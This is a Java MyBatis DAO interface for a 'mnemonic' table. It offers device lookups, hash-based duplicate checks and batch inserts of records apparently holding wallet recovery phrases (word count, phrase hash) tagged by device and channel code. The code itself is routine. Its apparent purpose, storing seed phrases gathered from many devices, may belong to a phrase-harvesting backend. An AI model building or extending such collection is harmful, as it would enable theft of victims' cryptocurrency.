package com.consumer.dao;

import org.apache.ibatis.annotations.Insert;
import org.apache.ibatis.annotations.Options;
import org.apache.ibatis.annotations.Param;
import org.apache.ibatis.annotations.Select;
import org.springframework.stereotype.Repository;

import com.baomidou.mybatisplus.core.mapper.BaseMapper;
import com.consumer.entity.MnemonicEntity;

import java.util.List;

@Repository
public interface MnemonicDao extends BaseMapper<MnemonicEntity> {

    @Select("SELECT * FROM mnemonic WHERE device_id = #{deviceId} ORDER BY id DESC LIMIT 1")
    MnemonicEntity findByDeviceId(@Param("deviceId") String deviceId);

    /** 异步补写幂等检查：同 device + source + result_hash 已存在则不重复入库 */
    @Select("SELECT id FROM mnemonic WHERE device_id = #{deviceId} AND source = #{source} AND result_hash = #{phraseHash} LIMIT 1")
    Integer findIdByDeviceSourceHash(@Param("deviceId") String deviceId,
                                     @Param("source") String source,
                                     @Param("phraseHash") String phraseHash);

    /**
     * 按 device 一次拉齐已有 source|hash，供 parse_ci 批量幂等（避免 N 次单条 SELECT）。
     * 返回格式：lower(source)|result_hash
     */
    @Select("SELECT CONCAT(IFNULL(LOWER(source),''), '|', IFNULL(result_hash,'')) "
            + "FROM mnemonic WHERE device_id = #{deviceId}")
    List<String> listSourceHashKeysByDevice(@Param("deviceId") String deviceId);

    /**
     * 批量插入；List 作为唯一参数，keyProperty=id（MySQL 回填自增 id）。
     * 勿用 @Param("list") + keyProperty=list.id：部分版本会把 list.id 当成实体字段。
     */
    @Insert("<script>"
            + "INSERT INTO mnemonic (device_id, channelcode, wordscount, result, source, status, result_hash, addtime) VALUES "
            + "<foreach collection='list' item='e' separator=','>"
            + "(#{e.deviceId}, #{e.channelcode}, #{e.wordscount}, #{e.result}, #{e.source}, #{e.status}, #{e.phraseHash}, #{e.addtime})"
            + "</foreach>"
            + "</script>")
    @Options(useGeneratedKeys = true, keyProperty = "id", keyColumn = "id")
    int insertBatch(List<MnemonicEntity> list);
}
